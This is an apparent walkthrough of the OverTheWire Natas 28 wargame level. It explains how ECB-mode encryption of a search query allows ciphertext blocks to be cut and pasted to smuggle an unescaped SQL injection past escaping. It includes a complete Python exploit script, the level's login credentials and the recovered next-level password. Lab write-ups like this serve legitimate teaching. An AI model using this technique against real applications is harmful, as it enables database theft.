# Natas Level 28

> Username: natas28

> Password: Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3

> URL: http://natas28.natas.labs.overthewire.org

## Solution

Entering the URL, we find a simple search page called `Whack Computer Joke Database`. We can search for jokes, and the results are displayed normally.

Unlike the previous levels, we don't have PHP source code to inspect. So let's start by observing the requests.

When we search for something simple, like `a`, the browser redirects us to:

```text
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
```

The `query` parameter looks like Base64, so let's investigate it using `CyberChef`.

First, we copy the value of `query` and use the following recipe:

1. URL Decode
    
2. From Base64

The output looks like random binary data instead of readable text. This tells us that Base64 is only an encoding layer and the actual data is encrypted.

By testing different search queries, we can observe that some parts of the encrypted value remain identical.
This is a strong indication that the application is using a block cipher.
After experimenting with different input lengths, we discover that the block size is 16 bytes. And this points us towards AES.
More specifically, the application uses `AES in ECB mode`.

The main weakness of ECB is that each block is encrypted independently:

```text
Plaintext:

[Block 1] [Block 2] [Block 3] [Block 4]

       AES encryption

Ciphertext:

[Block 1] [Block 2] [Block 3] [Block 4]
```

There is no dependency between the blocks. That means if two plaintext blocks are identical, their encrypted ciphertext blocks will also be identical.
More importantly, we can take encrypted blocks from different requests and combine them without knowing the encryption key.
This is called an `ECB cut-and-paste attack`.

Since the application is querying a database, the first idea was to try a normal SQL injection like:

```text
' UNION SELECT password FROM users; #
```

But this doesn't work. Because the application escapes special characters before encrypting the query. This prevents our quote from terminating the original SQL string.

So instead of bypassing the escaping directly, we can take advantage of the fact that the application encrypts the resulting query using ECB.

First we need to understand how our input affects the encrypted blocks.
So after testing different values, we notice the following:
1/ The first two ciphertext blocks remain constant.
2/ The third block changes depending on our input.
3/ The last blocks contain the application's fixed trailing query data.

We also notice something important when sending special characters.
Characters such as `'`, `"` and `\` cause changes in the third block because they are escaped by the application.

Now let's try the following input:

```text
AAAAAAAAA'
```

That's nine `A` characters followed by a single quote.
The application escapes the quote. 
Because of the fixed SQL prefix, the nine `A`s and the added backslash fill the remaining space in the third 16-byte block. So the actual quote is pushed to the beginning of the fourth block.

Now our strategy is:
1/ Generate a malicious encrypted query containing our SQL injection.
2/ Replace the third block, which contains the unwanted escape character, with a harmless block from another request.
3/ Keep the encrypted SQL injection blocks.
4/ Restore the original trailing blocks.
 
The server will decrypt our modified ciphertext and receive a query in which the single quote is no longer escaped.

Now we need three things:
1/ A known-good prefix and dummy block
We send a harmless query containing ten `A` characters:

```text
AAAAAAAAAA
```

Its encrypted ciphertext will give us the first three blocks: the fixed SQL prefix and a clean third block.
We will also use the remaining ciphertext from this request as our known-good suffix.

2/ Our malicious query

```text
AAAAAAAAA' UNION SELECT password FROM users; #
```

The application escapes the quote, but because we used nine `A` characters, the quote is aligned at the beginning of the next block.

3/ The ciphertext blocks containing the injection
We extract the encrypted blocks after the first three blocks from the malicious query.

The final structure will look like this:

```text
[Known-good first 3 blocks]
[Encrypted SQL injection blocks]
[Known-good trailing blocks]
```

Instead of doing this manually, we can automate the entire process.

```shell
nano natas28.py
```

```python
import requests
import base64
import math
from urllib.parse import urlsplit, parse_qs

# Target
url = "http://natas28.natas.labs.overthewire.org"

# Credentials
auth = (
    "natas28",
    "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3"
)

session = requests.Session()
session.auth = auth

block_size = 16


def encrypt_query(query):

    # Send the query to the application
    r = session.post(
        url + "/index.php",
        data={"query": query}
    )

    r.raise_for_status()

    # Extract the encrypted query from the redirect URL
    params = parse_qs(
        urlsplit(r.url).query
    )

    if "query" not in params:
        raise RuntimeError("Encrypted query not found")

    encrypted = params["query"][0]

    # Decode Base64 to get the raw ciphertext
    return base64.b64decode(
        encrypted,
        validate=True
    )


# Step 1: Generate a harmless reference ciphertext
# Ten A characters give us a clean third block.

placeholder = encrypt_query("a" * 10)


# Step 2: Create our SQL injection

payload = (
    "a" * 9
    + "' UNION SELECT password FROM users; #"
)

encrypted_payload = encrypt_query(payload)


# Step 3: Calculate how many blocks contain our injection

blocks = math.ceil(
    (len(payload) - 10) / block_size
)


# Step 4: Construct the forged ciphertext

forged = (
    placeholder[:48]
    + encrypted_payload[48:48 + blocks * block_size]
    + placeholder[48:]
)


# Step 5: Encode the forged ciphertext in Base64

forged_query = base64.b64encode(
    forged
).decode()


# Step 6: Send the modified ciphertext directly to search.php

r = session.get(
    url + "/search.php/",
    params={"query": forged_query}
)

r.raise_for_status()

print("[+] Exploit executed successfully!")
print(r.text)
```

Running the script give us:

```text
[+] Exploit executed successfully!
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas28", "pass": "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3" };</script></head>
<body>
<!-- morla/10111 -->
<h1>natas28</h1>
<style>
ul {
  margin: 1em 0;
  padding: 0 0 0 40px;
}

li {
  margin: 1em 0;
}
</style>
<div id="content">
<h2> Whack Computer Joke Database</h2><ul><li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li></ul>
</div>
</body>
</html>
```

```text
hwgoYUiGWoSZAqphtCAZf7u1jS16KEah
```

